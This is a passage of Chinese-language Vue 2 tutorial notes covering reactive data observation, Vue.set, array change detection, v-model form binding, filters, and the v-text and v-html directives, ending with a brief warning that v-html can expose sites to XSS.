                    <span class="na">sAge</span><span class="p">:</span><span class="mi">29</span><span class="p">,</span>
                <span class="p">},</span>
                <span class="na">friends</span><span class="p">:[</span>
                    <span class="p">{</span><span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">jerry</span><span class="dl">'</span><span class="p">,</span><span class="na">age</span><span class="p">:</span><span class="mi">35</span><span class="p">}</span>
                <span class="p">]</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">})</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><p><img src="C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220326165342751.png" alt="image-20220326165342751" /></p><blockquote><p>讲一下解析模板后面的操作—》调用 set 方法时，就会去解析模板—–&gt;生成新的虚拟 DOM—–&gt;新旧DOM 对比 —–&gt; 更新页面</p></blockquote><p>模拟一下 vue 中的 数据监测</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;</span><span class="k">script</span> <span class="na">type=</span><span class="s">"text/javascript"</span> <span class="nt">&gt;</span>

    <span class="kd">let</span> <span class="nx">data</span> <span class="o">=</span> <span class="p">{</span>
        <span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">尚硅谷</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">address</span><span class="p">:</span><span class="dl">'</span><span class="s1">北京</span><span class="dl">'</span><span class="p">,</span>
    <span class="p">}</span>

    <span class="c1">//创建一个监视的实例对象，用于监视data中属性的变化</span>
    <span class="kd">const</span> <span class="nx">obs</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Observer</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span>		
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">obs</span><span class="p">)</span>	

    <span class="c1">//准备一个vm实例对象</span>
    <span class="kd">let</span> <span class="nx">vm</span> <span class="o">=</span> <span class="p">{}</span>
    <span class="nx">vm</span><span class="p">.</span><span class="nx">_data</span> <span class="o">=</span> <span class="nx">data</span> <span class="o">=</span> <span class="nx">obs</span>

    <span class="kd">function</span> <span class="nx">Observer</span><span class="p">(</span><span class="nx">obj</span><span class="p">){</span>
        <span class="c1">//汇总对象中所有的属性形成一个数组</span>
        <span class="kd">const</span> <span class="nx">keys</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">keys</span><span class="p">(</span><span class="nx">obj</span><span class="p">)</span>
        <span class="c1">//遍历</span>
        <span class="nx">keys</span><span class="p">.</span><span class="nx">forEach</span><span class="p">((</span><span class="nx">k</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="nx">k</span><span class="p">,</span> <span class="p">{</span>
                <span class="kd">get</span><span class="p">()</span> <span class="p">{</span>
                    <span class="k">return</span> <span class="nx">obj</span><span class="p">[</span><span class="nx">k</span><span class="p">]</span>
                <span class="p">},</span>
                <span class="kd">set</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">`</span><span class="p">${</span><span class="nx">k</span><span class="p">}</span><span class="s2">被改了，我要去解析模板，生成虚拟DOM.....我要开始忙了`</span><span class="p">)</span>
                    <span class="nx">obj</span><span class="p">[</span><span class="nx">k</span><span class="p">]</span> <span class="o">=</span> <span class="nx">val</span>
                <span class="p">}</span>
            <span class="p">})</span>
        <span class="p">})</span>
    <span class="p">}</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><p><img src="C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220326184000838.png" alt="image-20220326184000838" /></p><p><strong>Vue.set 的使用</strong></p><p>Vue.set(target，propertyName/index，value) 或</p><p>vm.$set(target，propertyName/index，value)</p><p><strong>用法</strong>：</p><p>向响应式对象中添加一个 property，并确保这个新 property 同样是响应式的，且触发视图更新。它必须用于向响应式对象上添加新 property，因为 Vue 无法探测普通的新增 property (比如 <code class="language-plaintext highlighter-rouge">vm.myObject.newProperty = 'hi'</code>)</p><blockquote><p>代码</p></blockquote><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- 准备好一个容器--&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;h1&gt;</span>学生信息<span class="nt">&lt;/h1&gt;</span>
    <span class="nt">&lt;button</span> <span class="err">@</span><span class="na">click=</span><span class="s">"addSex"</span><span class="nt">&gt;</span>添加性别属性，默认值：男<span class="nt">&lt;/button&gt;</span> <span class="nt">&lt;br/&gt;</span>
<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span> <span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
    <span class="nx">Vue</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">productionTip</span> <span class="o">=</span> <span class="kc">false</span> <span class="c1">//阻止 vue 在启动时生成生产提示。</span>

    <span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
        <span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">data</span><span class="p">:{</span>
            <span class="na">student</span><span class="p">:{</span>
                <span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">tom</span><span class="dl">'</span><span class="p">,</span>
                <span class="na">age</span><span class="p">:</span><span class="mi">18</span><span class="p">,</span>
                <span class="na">hobby</span><span class="p">:[</span><span class="dl">'</span><span class="s1">抽烟</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">喝酒</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">烫头</span><span class="dl">'</span><span class="p">],</span>
                <span class="na">friends</span><span class="p">:[</span>
                    <span class="p">{</span><span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">jerry</span><span class="dl">'</span><span class="p">,</span><span class="na">age</span><span class="p">:</span><span class="mi">35</span><span class="p">},</span>
                    <span class="p">{</span><span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">tony</span><span class="dl">'</span><span class="p">,</span><span class="na">age</span><span class="p">:</span><span class="mi">36</span><span class="p">}</span>
                <span class="p">]</span>
            <span class="p">}</span>
        <span class="p">},</span>
        <span class="na">methods</span><span class="p">:</span> <span class="p">{</span>
            <span class="nx">addSex</span><span class="p">(){</span>
                <span class="c1">// Vue.set(this.student,'sex','男')</span>
                <span class="k">this</span><span class="p">.</span><span class="nx">$set</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">student</span><span class="p">,</span><span class="dl">'</span><span class="s1">sex</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">男</span><span class="dl">'</span><span class="p">)</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">})</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><p>Vue.set() 或 vm.$set 有缺陷：</p><p><img src="C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220326190428396.png" alt="image-20220326190428396" /></p><blockquote><p>就是 vm 和 _data</p></blockquote><p>看完了 vue 监测对象中的数据，再来看看 vue 如何监测 数组里的数据</p><blockquote><p>先写个代码案例</p></blockquote><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- 准备好一个容器--&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;h2&gt;</span>爱好<span class="nt">&lt;/h2&gt;</span>
    <span class="nt">&lt;ul&gt;</span>
        <span class="nt">&lt;li</span> <span class="na">v-for=</span><span class="s">"(h,index) in student.hobby"</span> <span class="na">:key=</span><span class="s">"index"</span><span class="nt">&gt;</span>
            
        <span class="nt">&lt;/li&gt;</span>
    <span class="nt">&lt;/ul&gt;</span>
    <span class="nt">&lt;h2&gt;</span>朋友们<span class="nt">&lt;/h2&gt;</span>
    <span class="nt">&lt;ul&gt;</span>
        <span class="nt">&lt;li</span> <span class="na">v-for=</span><span class="s">"(f,index) in student.friends"</span> <span class="na">:key=</span><span class="s">"index"</span><span class="nt">&gt;</span>
            --
        <span class="nt">&lt;/li&gt;</span>
    <span class="nt">&lt;/ul&gt;</span>
<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span> <span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
    <span class="nx">Vue</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">productionTip</span> <span class="o">=</span> <span class="kc">false</span> <span class="c1">//阻止 vue 在启动时生成生产提示。</span>

    <span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
        <span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">data</span><span class="p">:</span>
            <span class="na">student</span><span class="p">:{</span>
                <span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">tom</span><span class="dl">'</span><span class="p">,</span>
                <span class="na">age</span><span class="p">:{</span>
                    <span class="na">rAge</span><span class="p">:</span><span class="mi">40</span><span class="p">,</span>
                    <span class="na">sAge</span><span class="p">:</span><span class="mi">29</span><span class="p">,</span>
                <span class="p">},</span>
                <span class="na">hobby</span><span class="p">:[</span><span class="dl">'</span><span class="s1">抽烟</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">喝酒</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">烫头</span><span class="dl">'</span><span class="p">],</span>
                <span class="na">friends</span><span class="p">:[</span>
                    <span class="p">{</span><span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">jerry</span><span class="dl">'</span><span class="p">,</span><span class="na">age</span><span class="p">:</span><span class="mi">35</span><span class="p">},</span>
                    <span class="p">{</span><span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">tony</span><span class="dl">'</span><span class="p">,</span><span class="na">age</span><span class="p">:</span><span class="mi">36</span><span class="p">}</span>
                <span class="p">]</span>
            <span class="p">}</span>
        <span class="p">},</span>
        <span class="nx">methods</span><span class="p">:</span> <span class="p">{</span>
            
        <span class="p">}</span>
    <span class="p">})</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><p><img src="C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220326192837951.png" alt="image-20220326192837951" /></p><blockquote><p>所以我们通过 vm._data.student.hobby[0] = ‘aaa’ // 不奏效</p><p>vue 监测在数组那没有 getter 和 setter，所以监测不到数据的更改，也不会引起页面的更新</p></blockquote><p><img src="C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220326193108910.png" alt="image-20220326193108910" /></p><p>既然 vue 在对数组无法通过 getter 和 setter 进行数据监视，那 vue 到底如何监视数组数据的变化呢？</p><p>vue对数组的监测是通过 包装数组上常用的用于修改数组的方法来实现的。</p><p>vue官网的解释：</p><p><img src="C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220326194203065.png" alt="image-20220326194203065" /></p><p><strong>总结：</strong></p><p>Vue监视数据的原理：</p><ul><li><p>vue会监视data中所有层次的数据</p></li><li><p>如何监测对象中的数据？</p><p>通过setter实现监视，且要在new Vue时就传入要监测的数据。</p><ul><li><p>对象中后追加的属性，Vue默认不做响应式处理</p></li><li><p>如需给后添加的属性做响应式，请使用如下API：</p><p>Vue.set(target，propertyName/index，value) 或</p><p>vm.$set(target，propertyName/index，value)</p></li></ul></li><li><p>如何监测数组中的数据？</p><p>通过包裹数组更新元素的方法实现，本质就是做了两件事：</p><ul><li>调用原生对应的方法对数组进行更新</li><li>重新解析模板，进而更新页面</li></ul></li><li><p>在Vue修改数组中的某个元素一定要用如下方法：</p><ul><li>使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()</li><li>Vue.set() 或 vm.$set()</li></ul></li></ul><blockquote><p>特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！</p></blockquote><h2 id="115-收集表单数据">1.15 收集表单数据</h2><p>若：<input type="text" />，则v-model收集的是value值，用户输入的就是value值。</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- 准备好一个容器--&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;form</span> <span class="err">@</span><span class="na">submit.prevent=</span><span class="s">"demo"</span><span class="nt">&gt;</span>
        账号：<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">v-model.trim=</span><span class="s">"userInfo.account"</span><span class="nt">&gt;</span> <span class="nt">&lt;br/&gt;&lt;br/&gt;</span>
        密码：<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"password"</span> <span class="na">v-model=</span><span class="s">"userInfo.password"</span><span class="nt">&gt;</span> <span class="nt">&lt;br/&gt;&lt;br/&gt;</span>
        年龄：<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"number"</span> <span class="na">v-model.number=</span><span class="s">"userInfo.age"</span><span class="nt">&gt;</span> <span class="nt">&lt;br/&gt;&lt;br/&gt;</span>
        <span class="nt">&lt;button&gt;</span>提交<span class="nt">&lt;/button&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span> <span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
    <span class="nx">Vue</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">productionTip</span> <span class="o">=</span> <span class="kc">false</span>

    <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
        <span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">data</span><span class="p">:{</span>
            <span class="na">userInfo</span><span class="p">:{</span>
                <span class="na">account</span><span class="p">:</span><span class="dl">''</span><span class="p">,</span>
                <span class="na">password</span><span class="p">:</span><span class="dl">''</span><span class="p">,</span>
                <span class="na">age</span><span class="p">:</span><span class="mi">18</span><span class="p">,</span>
            <span class="p">}</span>
        <span class="p">},</span>
        <span class="na">methods</span><span class="p">:</span> <span class="p">{</span>
            <span class="nx">demo</span><span class="p">(){</span>
                <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">userInfo</span><span class="p">))</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">})</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><p>若：<input type="radio" />，则v-model收集的是value值，且要给标签配置value值。</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- 准备好一个容器--&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;form</span> <span class="err">@</span><span class="na">submit.prevent=</span><span class="s">"demo"</span><span class="nt">&gt;</span>
        性别：
        男<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"radio"</span> <span class="na">name=</span><span class="s">"sex"</span> <span class="na">v-model=</span><span class="s">"userInfo.sex"</span> <span class="na">value=</span><span class="s">"male"</span><span class="nt">&gt;</span>
        女<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"radio"</span> <span class="na">name=</span><span class="s">"sex"</span> <span class="na">v-model=</span><span class="s">"userInfo.sex"</span> <span class="na">value=</span><span class="s">"female"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span> <span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
    <span class="nx">Vue</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">productionTip</span> <span class="o">=</span> <span class="kc">false</span>

    <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
        <span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">data</span><span class="p">:{</span>
            <span class="na">userInfo</span><span class="p">:{</span>
                <span class="na">sex</span><span class="p">:</span><span class="dl">'</span><span class="s1">female</span><span class="dl">'</span>
            <span class="p">}</span>
        <span class="p">},</span>
        <span class="na">methods</span><span class="p">:</span> <span class="p">{</span>
            <span class="nx">demo</span><span class="p">(){</span>
                <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">userInfo</span><span class="p">))</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">})</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><p>若：<input type="checkbox" /></p><ul><li>没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）</li><li>配置input的value属性:<ul><li>v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）</li><li>v-model的初始值是数组，那么收集的的就是value组成的数组</li></ul></li></ul><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- 准备好一个容器--&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;form</span> <span class="err">@</span><span class="na">submit.prevent=</span><span class="s">"demo"</span><span class="nt">&gt;</span>
        爱好：
        学习<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"checkbox"</span> <span class="na">v-model=</span><span class="s">"userInfo.hobby"</span> <span class="na">value=</span><span class="s">"study"</span><span class="nt">&gt;</span>
        打游戏<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"checkbox"</span> <span class="na">v-model=</span><span class="s">"userInfo.hobby"</span> <span class="na">value=</span><span class="s">"game"</span><span class="nt">&gt;</span>
        吃饭<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"checkbox"</span> <span class="na">v-model=</span><span class="s">"userInfo.hobby"</span> <span class="na">value=</span><span class="s">"eat"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;br/&gt;&lt;br/&gt;</span>
        所属校区
        <span class="nt">&lt;select</span> <span class="na">v-model=</span><span class="s">"userInfo.city"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;option</span> <span class="na">value=</span><span class="s">""</span><span class="nt">&gt;</span>请选择校区<span class="nt">&lt;/option&gt;</span>
            <span class="nt">&lt;option</span> <span class="na">value=</span><span class="s">"beijing"</span><span class="nt">&gt;</span>北京<span class="nt">&lt;/option&gt;</span>
            <span class="nt">&lt;option</span> <span class="na">value=</span><span class="s">"shanghai"</span><span class="nt">&gt;</span>上海<span class="nt">&lt;/option&gt;</span>
            <span class="nt">&lt;option</span> <span class="na">value=</span><span class="s">"shenzhen"</span><span class="nt">&gt;</span>深圳<span class="nt">&lt;/option&gt;</span>
            <span class="nt">&lt;option</span> <span class="na">value=</span><span class="s">"wuhan"</span><span class="nt">&gt;</span>武汉<span class="nt">&lt;/option&gt;</span>
        <span class="nt">&lt;/select&gt;</span>
        <span class="nt">&lt;br/&gt;&lt;br/&gt;</span>
        其他信息：
        <span class="nt">&lt;textarea</span> <span class="na">v-model.lazy=</span><span class="s">"userInfo.other"</span><span class="nt">&gt;&lt;/textarea&gt;</span> <span class="nt">&lt;br/&gt;&lt;br/&gt;</span>
        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"checkbox"</span> <span class="na">v-model=</span><span class="s">"userInfo.agree"</span><span class="nt">&gt;</span>阅读并接受<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"http://www.atguigu.com"</span><span class="nt">&gt;</span>《用户协议》<span class="nt">&lt;/a&gt;</span>
        <span class="nt">&lt;button&gt;</span>提交<span class="nt">&lt;/button&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span> <span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
    <span class="nx">Vue</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">productionTip</span> <span class="o">=</span> <span class="kc">false</span>

    <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
        <span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">data</span><span class="p">:{</span>
            <span class="na">userInfo</span><span class="p">:{</span>
                <span class="na">hobby</span><span class="p">:[],</span>
                <span class="na">city</span><span class="p">:</span><span class="dl">'</span><span class="s1">beijing</span><span class="dl">'</span><span class="p">,</span>
                <span class="na">other</span><span class="p">:</span><span class="dl">''</span><span class="p">,</span>
                <span class="na">agree</span><span class="p">:</span><span class="dl">''</span>
            <span class="p">}</span>
        <span class="p">},</span>
        <span class="na">methods</span><span class="p">:</span> <span class="p">{</span>
            <span class="nx">demo</span><span class="p">(){</span>
                <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">userInfo</span><span class="p">))</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">})</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><p><img src="C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220326200704357.png" alt="image-20220326200704357" /></p><blockquote><p>备注：v-model的三个修饰符：</p><p>lazy：失去焦点再收集数据</p><p>number：输入字符串转为有效的数字</p><p>trim：输入首尾空格过滤</p></blockquote><h2 id="116-过滤器非重点">1.16 过滤器（非重点）</h2><p>定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。</p><p><strong>语法：</strong></p><ul><li>注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}}</li><li><table><tbody><tr><td>使用过滤器： 或 v-bind:属性 = “xxx</td><td>过滤器名”</td></tr></tbody></table></li></ul><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- 准备好一个容器--&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;h2&gt;</span>显示格式化后的时间<span class="nt">&lt;/h2&gt;</span>
    <span class="c">&lt;!-- 计算属性实现 --&gt;</span>
    <span class="nt">&lt;h3&gt;</span>现在是：<span class="nt">&lt;/h3&gt;</span>
    <span class="c">&lt;!-- methods实现 --&gt;</span>
    <span class="nt">&lt;h3&gt;</span>现在是：<span class="nt">&lt;/h3&gt;</span>
    <span class="c">&lt;!-- 过滤器实现 --&gt;</span>
    <span class="nt">&lt;h3&gt;</span>现在是：<span class="nt">&lt;/h3&gt;</span>
    <span class="c">&lt;!-- 过滤器实现（传参） --&gt;</span>
    <span class="nt">&lt;h3&gt;</span>现在是：<span class="nt">&lt;/h3&gt;</span>
    <span class="nt">&lt;h3</span> <span class="na">:x=</span><span class="s">"msg | mySlice"</span><span class="nt">&gt;</span>尚硅谷<span class="nt">&lt;/h3&gt;</span>
<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span> <span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
    <span class="nx">Vue</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">productionTip</span> <span class="o">=</span> <span class="kc">false</span>
    <span class="c1">//全局过滤器</span>
    <span class="nx">Vue</span><span class="p">.</span><span class="nx">filter</span><span class="p">(</span><span class="dl">'</span><span class="s1">mySlice</span><span class="dl">'</span><span class="p">,</span><span class="kd">function</span><span class="p">(</span><span class="nx">value</span><span class="p">){</span>
        <span class="k">return</span> <span class="nx">value</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">)</span>
    <span class="p">})</span>

    <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
        <span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">data</span><span class="p">:{</span>
            <span class="na">time</span><span class="p">:</span><span class="mi">1621561377603</span><span class="p">,</span> <span class="c1">//时间戳</span>
            <span class="na">msg</span><span class="p">:</span><span class="dl">'</span><span class="s1">你好，尚硅谷</span><span class="dl">'</span>
        <span class="p">},</span>
        <span class="na">computed</span><span class="p">:</span> <span class="p">{</span>
            <span class="nx">fmtTime</span><span class="p">(){</span>
                <span class="k">return</span> <span class="nx">dayjs</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">time</span><span class="p">).</span><span class="nx">format</span><span class="p">(</span><span class="dl">'</span><span class="s1">YYYY年MM月DD日 HH:mm:ss</span><span class="dl">'</span><span class="p">)</span>
            <span class="p">}</span>
        <span class="p">},</span>
        <span class="na">methods</span><span class="p">:</span> <span class="p">{</span>
            <span class="nx">getFmtTime</span><span class="p">(){</span>
                <span class="k">return</span> <span class="nx">dayjs</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">time</span><span class="p">).</span><span class="nx">format</span><span class="p">(</span><span class="dl">'</span><span class="s1">YYYY年MM月DD日 HH:mm:ss</span><span class="dl">'</span><span class="p">)</span>
            <span class="p">}</span>
        <span class="p">},</span>
        <span class="c1">//局部过滤器</span>
        <span class="na">filters</span><span class="p">:{</span>
            <span class="nx">timeFormater</span><span class="p">(</span><span class="nx">value</span><span class="p">,</span> <span class="nx">str</span><span class="o">=</span><span class="dl">'</span><span class="s1">YYYY年MM月DD日 HH:mm:ss</span><span class="dl">'</span><span class="p">){</span>
                <span class="c1">// console.log('@',value)</span>
                <span class="k">return</span> <span class="nx">dayjs</span><span class="p">(</span><span class="nx">value</span><span class="p">).</span><span class="nx">format</span><span class="p">(</span><span class="nx">str</span><span class="p">)</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">})</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><blockquote><p>备注：</p><p>1.过滤器也可以接收额外参数、多个过滤器也可以串联</p><p>2.并没有改变原本的数据, 是产生新的对应的数据</p></blockquote><h2 id="117-内置指令">1.17 内置指令</h2><p><strong>v-text指令：</strong>(使用的比较少)</p><p>1.作用：向其所在的节点中渲染文本内容。</p><p>2.与插值语法的区别：v-text会替换掉节点中的内容，则不会。</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- 准备好一个容器--&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;div&gt;</span>你好，<span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">v-text=</span><span class="s">"name"</span><span class="nt">&gt;&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">v-text=</span><span class="s">"str"</span><span class="nt">&gt;&lt;/div&gt;</span>
<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span> <span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
    <span class="nx">Vue</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">productionTip</span> <span class="o">=</span> <span class="kc">false</span> <span class="c1">//阻止 vue 在启动时生成生产提示。</span>

    <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
        <span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">data</span><span class="p">:{</span>
            <span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">张三</span><span class="dl">'</span><span class="p">,</span>
            <span class="na">str</span><span class="p">:</span><span class="dl">'</span><span class="s1">&lt;h3&gt;你好啊！&lt;/h3&gt;</span><span class="dl">'</span>
        <span class="p">}</span>
    <span class="p">})</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><p><strong>v-html指令：</strong>(使用的很少)</p><p>1.作用：向指定节点中渲染包含html结构的内容。</p><p>2.与插值语法的区别：</p><ul><li>v-html会替换掉节点中所有的内容，则不会。</li><li>v-html可以识别html结构。</li></ul><p>3.严重注意：v-html有安全性问题！！！！</p><ul><li>在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。</li><li>一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！</li></ul><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- 准备好一个容器--&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;div&gt;</span>你好，<span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">v-html=</span><span class="s">"str"</span><span class="nt">&gt;&lt;/div&gt;</span>
